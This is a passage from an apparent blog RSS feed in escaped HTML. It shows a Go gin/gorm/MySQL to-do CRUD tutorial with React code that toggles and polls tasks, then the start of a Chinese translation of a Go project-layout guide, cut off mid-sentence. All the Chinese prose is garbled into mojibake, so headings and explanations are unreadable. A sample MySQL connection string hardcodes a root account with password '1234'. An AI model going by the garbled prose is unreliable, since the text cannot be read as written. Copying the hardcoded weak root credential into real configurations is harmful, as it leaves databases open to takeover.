class="line">&quot;root:1234@tcp(127.0.0.1:3306)/tododb?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span><br></pre></td></tr></table></figure><br>ä»å‰å¾€åï¼šæ•°æ®åº“çš„ç”¨æˆ·åï¼Œå¯†ç ï¼Œåœ°å€ï¼Œæ•°æ®åº“åï¼Œå­—ç¬¦ç¼–ç æ ‡å‡†ï¼ˆutf8mb4è¿˜åŒ…æ‹¬emojiï¼‰ï¼Œgotimeä¸mysqlæ—¶é—´ä¿æŒä¸€è‡´ï¼Œè®¾ç½®æ—¶åŒºä¸ºæœ¬åœ°ã€‚<h1 id="é¡¹ç›®åŠŸèƒ½å®ç°"><a href="#é¡¹ç›®åŠŸèƒ½å®ç°" class="headerlink" title="é¡¹ç›®åŠŸèƒ½å®ç°"></a>é¡¹ç›®åŠŸèƒ½å®ç°</h1><h2 id="doneå€¼æ›´æ”¹"><a href="#doneå€¼æ›´æ”¹" class="headerlink" title="doneå€¼æ›´æ”¹"></a>doneå€¼æ›´æ”¹</h2><p>å‰ç«¯å¦‚ä¸‹ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">&#123;<span class="comment">/* æ˜¾ç¤ºæ•°æ®åº“æ•°æ® */</span>&#125;</span><br><span class="line">                    &#123;dbData.<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> (</span><br><span class="line">                        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;item.id&#125;</span> <span class="attr">className</span>=<span class="string">&#123;</span>`<span class="attr">card</span> <span class="attr">mb-2</span> $&#123;<span class="attr">item.done</span> ? &#x27;<span class="attr">bg-green-100</span>&#x27; <span class="attr">:</span> &#x27;<span class="attr">bg-red-100</span>&#x27;&#125;`&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> handleTaskToggle(item.id)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;card-body flex justify-between items-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;item.content&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> &#123;/* å·¦ä¾§å†…å®¹ */&#125;</span></span><br><span class="line"><span class="language-xml">                                <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;item.done ? &quot;å®Œæˆ&quot; : &quot;æœªå®Œæˆ&quot;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> &#123;/* å³ä¾§çŠ¶æ€ */&#125;</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">                    ))&#125;</span><br></pre></td></tr></table></figure><p>å¯¼å…¥éƒ¨åˆ†</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">SetStateAction</span>, useEffect, useState&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="comment">// å¯¼å…¥Bootstrapæ ·å¼</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">DbItem</span> &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">content</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">done</span>: <span class="built_in">boolean</span>;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…¶ä»–å±æ€§ï¼Œä¾‹å¦‚ id, title ç­‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°è®¾ç½®</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">KanbanBoard</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> [tasks, setTasks] = <span class="title function_">useState</span>([]); <span class="comment">// å‡è®¾çš„tasksçŠ¶æ€</span></span><br><span class="line">    <span class="keyword">const</span> [newTaskContent, setNewTaskContent] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>); <span class="comment">// æ–°ä»»åŠ¡çš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°å¢çŠ¶æ€æ¥å­˜å‚¨ä»æ•°æ®åº“è·å–çš„æ•°æ®</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨å®šä¹‰çš„ç±»å‹æ¥æŒ‡å®šçŠ¶æ€ç±»å‹</span></span><br><span class="line">    <span class="keyword">const</span> [dbData, setDbData] = useState&lt;<span class="title class_">DbItem</span>[]&gt;([]);</span><br><span class="line"><span class="comment">// å¤„ç†æ·»åŠ ä»»åŠ¡çš„äº‹ä»¶</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">handleAddTask</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (!newTaskContent) <span class="keyword">return</span>; <span class="comment">// å¦‚æœæ²¡æœ‰å†…å®¹åˆ™ä¸æ·»åŠ </span></span><br><span class="line">        <span class="keyword">const</span> newTask = &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">            <span class="attr">content</span>: newTaskContent,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// @ts-ignore</span></span><br><span class="line">        <span class="title function_">setTasks</span>([...tasks, newTask]);</span><br><span class="line">        <span class="title function_">setNewTaskContent</span>(<span class="string">&quot;&quot;</span>); <span class="comment">// æ¸…ç©ºè¾“å…¥æ¡†</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">handleTaskToggle</span> = <span class="keyword">async</span> (<span class="params">taskId: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">        <span class="comment">// æ‰¾åˆ°è¢«ç‚¹å‡»çš„ä»»åŠ¡</span></span><br><span class="line">        <span class="keyword">const</span> updatedTasks = dbData.<span class="title function_">map</span>(<span class="function"><span class="params">task</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (task.<span class="property">id</span> === taskId) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123; ...task, <span class="attr">done</span>: !task.<span class="property">done</span> &#125;; <span class="comment">// åˆ‡æ¢ä»»åŠ¡çš„å®ŒæˆçŠ¶æ€</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> task;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="title function_">setDbData</span>(updatedTasks); <span class="comment">// æ›´æ–°çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘é€æ›´æ–°åˆ°åç«¯</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œä½ éœ€è¦æ ¹æ®ä½ çš„APIé€‚é…</span></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`http://localhost:8080/todo/<span class="subst">$&#123;taskId&#125;</span>/toggle`</span>, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span> &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†è¾“å…¥æ¡†å†…å®¹å˜åŒ–çš„äº‹ä»¶</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">handleNewTaskChange</span> = (<span class="params">event: &#123; target: &#123; value: SetStateAction&lt;<span class="built_in">string</span>&gt;; &#125;; &#125;</span>) =&gt; &#123;</span><br><span class="line">        <span class="title function_">setNewTaskContent</span>(event.<span class="property">target</span>.<span class="property">value</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">fetchData</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://localhost:8080/data&#x27;</span>);</span><br><span class="line">                <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data:&quot;</span>, data); <span class="comment">// æ‰“å°æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line">                <span class="title function_">setDbData</span>(data);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error fetching data: &quot;</span>, error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">fetchData</span>();</span><br><span class="line">        <span class="comment">// å¦‚æœä½¿ç”¨è½®è¯¢ï¼Œå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®å®šæ—¶å™¨</span></span><br><span class="line">        <span class="keyword">const</span> interval = <span class="built_in">setInterval</span>(fetchData, <span class="number">5000</span>); <span class="comment">// æ¯5ç§’é’Ÿè·å–ä¸€æ¬¡æ•°æ®</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="built_in">clearInterval</span>(interval); <span class="comment">// æ¸…ç†å®šæ—¶å™¨</span></span><br><span class="line">    &#125;, []);</span><br></pre></td></tr></table></figure><p>golangçš„ä»£ç ï¼š</p><p>åœ¨mainä¸­</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.POST(<span class="string">&quot;/todo/:id/toggle&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    funcs.ToggleTaskStatus(c, db)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰ä¸€ä¸ªå‡½æ•°</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> funcs</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ToggleTaskStatus</span><span class="params">(c *gin.Context, db *gorm.DB)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> todo TODO</span><br><span class="line">id := c.Param(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ®IDæŸ¥æ‰¾ä»»åŠ¡</span></span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;todo, id).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusNotFound, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Task not found&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ‡æ¢ä»»åŠ¡çš„å®ŒæˆçŠ¶æ€</span></span><br><span class="line">todo.Done = !todo.Done</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´æ–°æ•°æ®åº“</span></span><br><span class="line"><span class="keyword">if</span> err := db.Save(&amp;todo).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to update task&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/go/">go</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/13/%E5%9F%BA%E4%BA%8Ego+gin+gorm+mysql%E5%AE%9E%E7%8E%B0%E7%9A%84CRUD%E9%A1%B9%E7%9B%AE%EF%BC%88%E6%9B%B4%E6%96%B0ing%EF%BC%89/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Goé¡¹ç›®æ ‡å‡†å¸ƒå±€</title>
      <link>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/</link>
      <guid>https://cjliblog.top/2023/12/13/GO%E8%AF%AD%E8%A8%80%E5%B8%83%E5%B1%80-%E4%B8%AD%E6%96%87%E7%89%88/</guid>
      <pubDate>Tue, 12 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯description</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Goé¡¹ç›®æ ‡å‡†å¸ƒå±€"><a href="#Goé¡¹ç›®æ ‡å‡†å¸ƒå±€" class="headerlink" title="Goé¡¹ç›®æ ‡å‡†å¸ƒå±€"></a>Goé¡¹ç›®æ ‡å‡†å¸ƒå±€</h1><ul><li><a href="README.md">English</a></li><li><a href="README_ko.md">í•œêµ­ì–´ ë¬¸ì„œ</a></li><li><a href="README_zh.md">ç®€ä½“ä¸­æ–‡</a></li><li><a href="README_zh-TW.md">æ­£é«”ä¸­æ–‡</a></li><li><a href="README_zh-CN.md">ç®€ä½“ä¸­æ–‡</a> - ???</li><li><a href="README_fr.md">FranÃ§ais</a></li><li><a href="README_ja.md">æ—¥æœ¬èª</a></li><li><a href="README_ptBR.md">Portuguese</a></li><li><a href="README_es.md">EspaÃ±ol</a></li><li><a href="README_ro.md">RomÃ¢nÄƒ</a></li><li><a href="README_ru.md">Ğ ÑƒÑÑĞºĞ¸Ğ¹</a></li><li><a href="README_tr.md">TÃ¼rkÃ§e</a></li><li><a href="README_it.md">Italiano</a></li><li><a href="README_vi.md">Vietnamese</a></li><li><a href="README_ua.md">Ğ£ĞºÑ€Ğ°Ñ—Ğ½ÑÑŒĞºĞ°</a></li><li><a href="README_id.md">Indonesian</a></li></ul><p>è¿™æ˜¯Goåº”ç”¨ç¨‹åºé¡¹ç›®çš„åŸºç¡€å¸ƒå±€ã€‚è¿™ä¸æ˜¯Goæ ¸å¿ƒå¼€å‘å›¢é˜Ÿå®šä¹‰çš„å®˜æ–¹æ ‡å‡†ï¼›æ— è®ºæ˜¯åœ¨ç»å…¸é¡¹ç›®è¿˜æ˜¯åœ¨æ–°å…´çš„é¡¹ç›®ä¸­ï¼Œè¿™éƒ½æ˜¯Goç”Ÿæ€ç³»ç»Ÿä¸­ä¸€ç»„å¸¸è§çš„é¡¹ç›®å¸ƒå±€æ¨¡å¼ã€‚è¿™å…¶ä¸­æœ‰ä¸€äº›æ¨¡å¼æ¯”å¦å¤–çš„ä¸€äº›æ›´å—æ¬¢è¿ã€‚å®ƒé€šè¿‡å‡ ä¸ªæ”¯æ’‘ç›®å½•ä¸ºä»»ä½•è¶³å¤Ÿå¤§è§„æ¨¡çš„å®é™…åº”ç”¨ç¨‹åºæä¾›ä¸€äº›å¢å¼ºåŠŸèƒ½ã€‚</p><p>å¦‚æœä½ æ­£å‡†å¤‡å­¦ä¹ Goã€æ­£åœ¨æ„å»ºPoCé¡¹ç›®æˆ–ç¼–å†™ç©å…·é¡¹ç›®ï¼Œé‚£ä¹ˆæŒ‰ç…§è¿™ä¸ªé¡¹ç›®è¿›è¡Œå¸ƒå±€å°±å¤§æå°ç”¨äº†ã€‚ä»ä¸€äº›çœŸæ­£ç®€å•çš„äº‹æƒ…å¼€å§‹ï¼ˆä¸€ä¸ª<code>main.go</code>æ–‡ä»¶å°±è¶³å¤Ÿäº†ï¼‰ã€‚éšç€é¡¹ç›®çš„å¢é•¿ï¼Œç¡®ä¿ä»£ç ç»“æ„çš„åˆç†æ˜¯éå¸¸é‡è¦çš„ï¼Œå¦åˆ™æœ€ç»ˆä¼šå‡ºç°å¾ˆå¤šéšè—çš„ä¾èµ–å…³ç³»å’Œå…¨å±€çŠ¶æ€è€Œå¯¼è‡´è¿™ä¸ªé¡¹ç›®çš„ä»£ç æ··ä¹±ã€‚å½“ä¸€ä¸ªé¡¹ç›®å¤šäººåŒæ—¶è¿›è¡Œæ—¶ï¼Œå°±æ›´éœ€è¦æœ‰æ¸…æ™°çš„ç»“æ„ï¼Œæ­¤æ—¶å¼•å…¥ä¸€ç§é€šç”¨çš„é¡¹ç›®åŒ…&#x2F;æ ‡å‡†åº“ç®¡ç†å·¥å…·å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚å½“ä½ ç»´æŠ¤ä¸€ä¸ªå¼€æºé¡¹ç›®æˆ–è€…æœ‰å…¶ä»–é¡¹ç›®å¯¼å…¥äº†ä½ çš„ä»£ç ï¼Œé‚£ä¹ˆæœ‰ä¸€ä¸ªç§æœ‰çš„åŒ…ï¼ˆå¦‚<code>internal</code>ï¼‰å°±å¾ˆé‡è¦äº†ã€‚å…‹éš†è¿™ä¸ªé¡¹ç›®ï¼Œä¿ç•™ä½ é¡¹ç›®ä¸­éœ€è¦çš„éƒ¨åˆ†ï¼Œå¹¶åˆ é™¤å…¶ä»–éƒ¨åˆ†ã€‚é€šå¸¸æ¥è¯´ä¸éœ€è¦ä¹Ÿæ²¡å¿…è¦ä½¿ç”¨è¿™ä¸ªé¡¹ç›®ä¸­çš„å…¨éƒ¨å†…å®¹ã€‚å› ä¸ºï¼Œä»æ¥æ²¡æœ‰åœ¨ä¸€ä¸ªå•ä¸€çš„é¡¹ç›®ä¸­ä½¿ç”¨æœ¬é¡¹ç›®ä¸­å®šä¹‰çš„å…¨éƒ¨æ¨¡å¼ï¼Œç”šè‡³å¦‚<code>vendor</code>æ¨¡å¼ã€‚</p><p>Go 1.14 <code>Go Modules</code>å·²ç»å¯ä»¥ç”¨äºç”Ÿäº§ç¯å¢ƒã€‚æ²¡æœ‰ä»€ä¹ˆç‰¹æ®ŠåŸå› çš„è¯ï¼Œè¯·ä½¿ç”¨<code>Go Modules</code>ï¼Œä½¿ç”¨å®ƒä¹‹åï¼Œä½ å°±å†ä¹Ÿä¸ç”¨æ‹…å¿ƒ<code>$GOPATH</code>çš„é…ç½®å’Œé¡¹ç›®å®é™…çš„å­˜æ”¾ä½ç½®ï¼Œé¡¹ç›®æƒ³æ”¾åœ¨å“ªé‡Œå°±æ”¾åœ¨å“ªé‡Œã€‚æœ¬é¡¹ç›®ä¸­<code>go.mod</code>æ–‡ä»¶çš„å†…å®¹å‡è®¾ä½ çš„é¡¹ç›®æ˜¯æ‰˜ç®¡åœ¨GitHubä¸Šçš„ï¼Œå½“ç„¶è¿™ä¸æ˜¯å¿…é€‰é¡¹ï¼Œå› ä¸º<code>Module</code>ä¸­çš„è·¯å¾„å¯ä»¥æ˜¯ä»»æ„çš„å€¼ï¼Œä¸€èˆ¬<code>Module</code>è·¯å¾„çš„ç¬¬ä¸€éƒ¨åˆ†ä¸­åº”è¯¥åŒ…å«ä¸€ä¸ªç‚¹ï¼ˆæœ€æ–°ç‰ˆçš„Goä¸­ä¸å†å¼ºåˆ¶è¦æ±‚è¿™ä¸€ç‚¹ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ç¨å¾®æ—§ä¸€äº›çš„ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå¯èƒ½é‡åˆ°ç¼–è¯‘å¤±è´¥çš„é—®é¢˜ï¼‰ã€‚äº†è§£æ›´å¤šè¯·çœ‹Issues <a href="https://github.com/golang/go/issues/37554">37554</a>å’Œ <a href="https://github.com/golang/go/issues/32819">32819</a>ã€‚</p><p>æœ¬é¡¹ç›®å¸ƒå±€æœ‰æ„è®¾è®¡çš„æ›´é€šç”¨ä¸€äº›ï¼Œè€Œä¸ä¼šå°è¯•å»å¼•å…¥ä¸€äº›ç‰¹å®šçš„GoåŒ…ç»“æ„ã€‚</p><p>è¿™æ˜¯ç¤¾åŒºå…±åŒçš„åŠªåŠ›ã€‚å¦‚æœå‘ç°äº†ä¸€ç§æ–°çš„æ¨¡å¼æˆ–è€…é¡¹ç›®ä¸­å·²ç»å­˜åœ¨çš„æŸäº›æ¨¡å¼éœ€è¦æ›´æ–°ï¼Œè¯·æ–°å»ºä¸€ä¸ªissueã€‚</p><p>å¦‚æœéœ€è¦ä¸€äº›å…³äºå‘½åã€æ ¼å¼åŒ–æˆ–è€…æ ·å¼æ–¹é¢çš„å¸®åŠ©ï¼Œè¯·å…ˆè¿è¡Œ<a href="https://golang.org/cmd/gofmt/"><code>gofmt</code></a>å’Œ<a href="https://github.com/golang/lint"><code>golint</code></a>ã€‚å¦å¤–ï¼Œè¯·åŠ¡å¿…é˜…è¯»ä»¥ä¸‹Goä»£ç æ ·å¼æŒ‡å—å’Œå»ºè®®ï¼š</p><ul><li><p><a href="https://talks.golang.org/2014/names.slide">https://talks.golang.org/2014/names.slide</a></p></li><li><p><a href="https://golang.org/doc/effective_go.html#names">https://golang.org/doc/effective_go.html#names</a></p></li><li><p><a href="https://blog.golang.org/package-names">https://blog.golang.org/package-names</a></p></li><li><p><a href="https://github.com/golang/go/wiki/CodeReviewComments">https://github.com/golang/go/wiki/CodeReviewComments</a></p></li><li><p>Style guideline for Go packages (rakyll&#x2F;JBD)</p></li></ul><p>æ›´å¤šèƒŒæ™¯ä¿¡æ¯è¯·æŸ¥çœ‹<a href="https://medium.com/golang-learn/go-project-layout-e5213cdcfaa2"><code>Go Project Layout</code></a>ã€‚</p><p>æœ‰å…³å‘½åå’Œé¡¹ç›®åŒ…ç»„ç»‡æ ·å¼ä»¥åŠå…¶ä»–ä»£ç ç»“æ„çš„æ›´å¤šæ¨èæ–‡ç« ï¼š</p><ul><li><a href="https://www.youtube.com/watch?v=PTE4VJIdHPg">GopherCon EU 2018: Peter Bourgon - Best Practices for Industrial Programming</a></li><li><a href="https://www.youtube.com/watch?v=MzTcsI6tn-0">GopherCon Russia 2018: Ashley McNamara + Brian Ketelsen - Go best practices</a></li><li><a href="https://www.youtube.com/watch?v=ltqV6pDKZD8">GopherCon 2017: Edward Muller - Go Anti-Patterns</a></li><li><a href="https://www.youtube.com/watch?v=oL6JBUk6tj0">GopherCon 2018: Kat Zien - How Do You Structure Your Go Apps</a></li></ul><h2 id="Goç›®å½•"><a href="#Goç›®å½•" class="headerlink" title="Goç›®å½•"></a>Goç›®å½•</h2><h3 id="cmd"><a href="#cmd" class="headerlink" title="/cmd"></a><code>/cmd</code></h3><p>é¡¹ç›®ä¸»è¦çš„åº”ç”¨ç¨‹åºã€‚</p><p>å¯¹äºæ¯ä¸ªåº”ç”¨ç¨‹åºæ¥è¯´è¿™ä¸ªç›®å½•çš„åå­—åº”è¯¥å’Œé¡¹ç›®å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ç›¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼Œ<code>/cmd/myapp</code>ï¼‰ã€‚</p><p>ä¸è¦åœ¨è¿™ä¸ªç›®å½•ä¸­æ”¾å¤ªå¤šçš„ä»£ç ã€‚å¦‚æœç›®å½•ä¸­çš„ä»£ç å¯ä»¥è¢«å…¶ä»–é¡¹ç›®å¯¼å…¥å¹¶ä½¿ç”¨ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠä»–ä»¬æ”¾åœ¨<code>/pkg</code>ç›®å½•ã€‚å¦‚æœç›®å½•ä¸­çš„ä»£ç ä¸å¯é‡ç”¨ï¼Œæˆ–è€…ä¸å¸Œæœ›è¢«ä»–äººä½¿ç”¨ï¼Œåº”è¯¥å°†ä»£ç æ”¾åœ¨<code>/internal</code>ç›®å½•ã€‚æ˜¾å¼åœ°è¡¨æ˜æ„å›¾æ¯”è¾ƒå¥½ï¼</p><p>é€šå¸¸æ¥è¯´ï¼Œé¡¹ç›®éƒ½åº”è¯¥æ‹¥æœ‰ä¸€ä¸ªå°çš„<code>main</code>å‡½æ•°ï¼Œå¹¶åœ¨<code>main</code>å‡½æ•°ä¸­å¯¼å…¥æˆ–è€…è°ƒç”¨<code>/internal</code>å’Œ<code>/pkg</code>ç›®å½•ä¸­çš„ä»£ç ã€‚</p><p>æ›´å¤šè¯¦æƒ…ï¼Œè¯·çœ‹<a href="https://github.com/golang-standards/project-layout/blob/master/cmd/README.md"><code>/cmd</code></a>ç›®å½•ä¸­çš„ä¾‹å­ã€‚</p><h3 id="internal"><a href="#internal" class="headerlink" title="/internal"></a><code>/internal</code></h3><p>ç§æœ‰çš„åº”ç”¨ç¨‹åºä»£ç åº“ã€‚è¿™äº›æ˜¯ä¸å¸Œæœ›è¢«å…¶ä»–äººå¯¼å…¥çš„ä»£ç ã€‚è¯·æ³¨æ„ï¼šè¿™ç§æ¨¡å¼æ˜¯Goç¼–è¯‘å™¨å¼ºåˆ¶æ‰§è¡Œçš„ã€‚è¯¦ç»†å†…å®¹æƒ…å†µGo 1.4çš„<a href="https://golang.org/doc/go1.4#internalpackages">release notes</a>ã€‚å†æ¬¡æ³¨æ„ï¼Œåœ¨é¡¹ç›®çš„ç›®å½•æ ‘ä¸­çš„ä»»æ„ä½ç½®éƒ½å¯ä»¥æœ‰<code>internal</code>ç›®å½•ï¼Œè€Œä¸ä»…ä»…æ˜¯åœ¨é¡¶çº§ç›®å½•ä¸­ã€‚</p><p>å¯ä»¥åœ¨å†…éƒ¨ä»£ç åŒ…ä¸­æ·»åŠ ä¸€äº›é¢å¤–çš„ç»“æ„ï¼Œæ¥åˆ†éš”å…±äº«å’Œéå…±äº«çš„å†…éƒ¨ä»£ç ã€‚è¿™ä¸æ˜¯å¿…é€‰é¡¹ï¼ˆå°¤å…¶æ˜¯åœ¨å°é¡¹ç›®ä¸­ï¼‰ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç›´è§‚çš„åŒ…ç”¨é€”æ˜¯å¾ˆæ£’çš„ã€‚åº”ç”¨ç¨‹åºå®é™…çš„ä»£ç å¯ä»¥æ”¾åœ¨<code>/internal/app</code>ç›®å½•ï¼ˆå¦‚ï¼Œ<code>internal/app/myapp</code>ï¼‰ï¼Œè€Œåº”ç”¨ç¨‹åºçš„å…±äº«ä»£ç æ”¾åœ¨<code>/internal/pkg</code>ç›®å½•ï¼ˆå¦‚ï¼Œ<code>internal/pkg/myprivlib</code>ï¼‰ä¸­ã€‚</p><h3 id="pkg"><a href="#pkg" class="headerlink" title="/pkg"></a><code>/pkg</code></h3><p>å¤–éƒ¨åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨çš„åº“ä»£ç ï¼ˆå¦‚ï¼Œ<code>/pkg/mypubliclib</code>ï¼‰ã€‚å…¶ä»–é¡¹ç›®å°†ä¼šå¯¼å…¥è¿™äº›åº“æ¥ä¿è¯é¡¹ç›®å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œæ‰€ä»¥åœ¨å°†ä»£ç æ”¾åœ¨è¿™é‡Œå‰ï¼Œä¸€å®šè¦ä¸‰æ€è€Œè¡Œã€‚è¯·æ³¨æ„ï¼Œ<code>internal</code>ç›®å½•æ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©æ¥ç¡®ä¿é¡¹ç›®ç§æœ‰ä»£ç ä¸ä¼šè¢«å…¶ä»–äººå¯¼å…¥ï¼Œå› ä¸ºè¿™æ˜¯Goå¼ºåˆ¶æ‰§è¡Œçš„ã€‚ä½¿ç”¨<code>/pkg</code>ç›®å½•æ¥æ˜ç¡®è¡¨ç¤ºä»£ç å¯ä»¥è¢«å…¶ä»–äººå®‰å…¨çš„å¯¼å…¥ä»ç„¶æ˜¯ä¸€ä¸ªå¥½æ–¹å¼ã€‚Travis Jefferyæ’°å†™çš„å…³äº <a href="https://travisjeffery.com/b/2019/11/i-ll-take-pkg-over-internal/">Iâ€™ll take pkg over internal</a> æ–‡ç« å¾ˆå¥½åœ°æ¦‚è¿°äº†<code>pkg</code>å’Œ<code>inernal</code>ç›®å½•ä»¥åŠä½•æ—¶ä½¿ç”¨å®ƒä»¬ã€‚</p><p>å½“æ‚¨çš„æ ¹ç›®å½•åŒ…å«å¤§é‡éGoç»„ä»¶å’Œç›®å½•æ—¶ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§å°†Goä»£ç åˆ†ç»„åˆ°ä¸€ä¸ªä½ç½®çš„æ–¹æ³•ï¼Œä»è€Œä½¿è¿è¡Œå„ç§Goå·¥å…·æ›´åŠ å®¹æ˜“ï¼ˆåœ¨å¦‚ä¸‹çš„æ–‡ç« ä¸­éƒ½æœ‰æåˆ°ï¼š2018å¹´GopherCon <a href="https://www.youtube.com/watch?v=PTE4VJIdHPg">Best Practices for Industrial Programming</a>ï¼Œ<a href="https://www.youtube.com/watch?v=oL6JBUk6tj0">Kat Zien - How Do You Structure Your Go Apps</a> ï¼ŒGolab 2018 <a href="https://www.youtube.com/watch?v=3gQa1LWwuzk">Massimiliano Pippi - Project layout patterns in Go</a>ï¼‰ã€‚</p><p>ç‚¹å‡»æŸ¥çœ‹<code>/pkg</code>å°±èƒ½çœ‹åˆ°é‚£äº›ä½¿ç”¨è¿™ä¸ªå¸ƒå±€æ¨¡å¼çš„æµè¡ŒGoä»£ç 